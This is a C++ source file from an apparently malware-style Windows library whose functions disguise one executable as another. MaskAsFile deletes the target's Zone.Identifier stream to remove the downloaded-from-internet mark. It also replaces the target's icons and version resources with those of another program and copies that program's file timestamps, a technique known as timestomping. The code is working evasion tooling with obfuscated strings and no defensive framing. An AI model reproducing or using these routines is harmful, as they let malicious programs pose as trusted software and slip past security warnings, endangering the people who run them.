#include "sys_includes.h"

#include "syslib\debug.h"
#include "syslib\config.h"
#include "syslib\mem.h"
#include "syslib\files.h"
#include "syslib\system.h"
#include "syslib\str.h"

#include "syslib\strcrypt.h"
#include "str_crx.h"

SYSLIBFUNC(BOOL) CopyFileTimeW(LPCWSTR lpFrom,LPCWSTR lpTo)
{
    if (!SYSLIB_SAFE::CheckStrParamW(lpFrom,MAX_PATH))
        return false;

    if (!SYSLIB_SAFE::CheckStrParamW(lpTo,MAX_PATH))
        return false;

    BOOL bRet=false;
    HANDLE hFileFrom=CreateFileW(lpFrom,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL);
    if (hFileFrom != INVALID_HANDLE_VALUE)
    {
        FILETIME ftCreate,ftAccess,ftWrite;
        GetFileTime(hFileFrom,&ftCreate,&ftAccess,&ftWrite);
        SysCloseHandle(hFileFrom);

        HANDLE hFileTo=CreateFileW(lpTo,FILE_WRITE_ATTRIBUTES,0,NULL,OPEN_EXISTING,FILE_FLAG_BACKUP_SEMANTICS,NULL);
        if (hFileTo != INVALID_HANDLE_VALUE)
        {
            bRet=(SetFileTime(hFileTo,&ftCreate,&ftAccess,&ftWrite) != FALSE);
            SysCloseHandle(hFileTo);
        }
    }
    return bRet;
}

SYSLIBFUNC(BOOL) CopyFileTimeA(LPCSTR lpFrom,LPCSTR lpTo)
{
    LPWSTR lpFromW=StrAnsiToUnicodeEx(lpFrom,0,NULL),
           lpToW=StrAnsiToUnicodeEx(lpTo,0,NULL);

    BOOL bRet=CopyFileTimeW(lpFromW,lpToW);

    MemFree(lpFromW);
    MemFree(lpToW);
    return bRet;
}

static bool CALLBACK UpdateResources(HMODULE hModule,LPWSTR lpType,LPWSTR lpName,LONG_PTR lParam)
{
    HRSRC hRes=FindResourceW(hModule,lpName,lpType);
    if (hRes)
    {
        HGLOBAL hResLoaded=LoadResource(hModule,hRes);
        if (hResLoaded)
        {
            void *pData=LockResource(hResLoaded);
            if (pData)
            {
                int nSizeOfRes=SizeofResource(hModule,hRes);
                UpdateResourceW((HANDLE)lParam,lpType,lpName,MAKELANGID(LANG_NEUTRAL,SUBLANG_NEUTRAL),pData,nSizeOfRes);
                UnlockResource(hResLoaded);
            }
            FreeResource(hResLoaded);
        }
    }
    return true;
}

static void DeleteIcons(LPCWSTR lpFile)
{
    LPWSTR lpTmpFile=GetTmpFileNameW(NULL,NULL);
    if (lpTmpFile)
    {
        if (CopyFileAndFlushBuffersW(lpFile,lpTmpFile,false))
        {
            HMODULE hLib=LoadLibraryExW(lpTmpFile,NULL,LOAD_LIBRARY_AS_DATAFILE);
            if (hLib)
            {
                HANDLE hResource=BeginUpdateResourceW(lpFile,true);
                if (hResource)
                {
                    EnumResourceNamesW(hLib,RT_RCDATA,(ENUMRESNAMEPROC)UpdateResources,(LONG_PTR)hResource);
                    EndUpdateResource(hResource,false);
                }
                FreeLibrary(hLib);
            }
            DeleteFileW(lpTmpFile);
        }
        MemFree(lpTmpFile);
    }
    return;
}

static bool ReplaceRSRC(LPCWSTR lpFrom,LPCWSTR lpTo)
{
    bool bRet=false;
    HMODULE hLib=LoadLibraryExW(lpFrom,NULL,LOAD_LIBRARY_AS_DATAFILE);
    if (hLib)
    {
        DeleteIcons(lpTo);
        HANDLE hResource=BeginUpdateResourceW(lpTo,false);
        if (hResource)
        {
            EnumResourceNamesW(hLib,RT_VERSION,(ENUMRESNAMEPROC)UpdateResources,(LONG_PTR)hResource);
            EnumResourceNamesW(hLib,RT_GROUP_ICON,(ENUMRESNAMEPROC)UpdateResources,(LONG_PTR)hResource);
            EnumResourceNamesW(hLib,RT_ICON,(ENUMRESNAMEPROC)UpdateResources,(LONG_PTR)hResource);
            bRet=(EndUpdateResource(hResource,false) != FALSE);
        }
        FreeLibrary(hLib);
        if (bRet)
            PE_ValidateFile(lpTo);
    }
    return bRet;
}

SYSLIBFUNC(BOOL) MaskAsFileW(LPCWSTR lpFrom,LPCWSTR lpTo)
{
    if (!SYSLIB_SAFE::CheckStrParamW(lpFrom,MAX_PATH))
        return false;

    if (!SYSLIB_SAFE::CheckStrParamW(lpTo,MAX_PATH))
        return false;

    WCHAR szNewBuf[MAX_PATH];
    StrFormatW(szNewBuf,dcrW_47ae2418("%s:Zone.Identifier"),lpTo);
    DeleteFileW(szNewBuf);

    BOOL bRet=false;
    if (ReplaceRSRC(lpFrom,lpTo))
        bRet=CopyFileTimeW(lpFrom,lpTo);
    return bRet;
}

SYSLIBFUNC(BOOL) MaskAsFileA(LPCSTR lpFrom,LPCSTR lpTo)
{
    LPWSTR lpFromW=StrAnsiToUnicodeEx(lpFrom,0,NULL),
           lpToW=StrAnsiToUnicodeEx(lpTo,0,NULL);

    BOOL bRet=MaskAsFileW(lpFromW,lpToW);

    MemFree(lpFromW);
    MemFree(lpToW);
    return bRet;
}

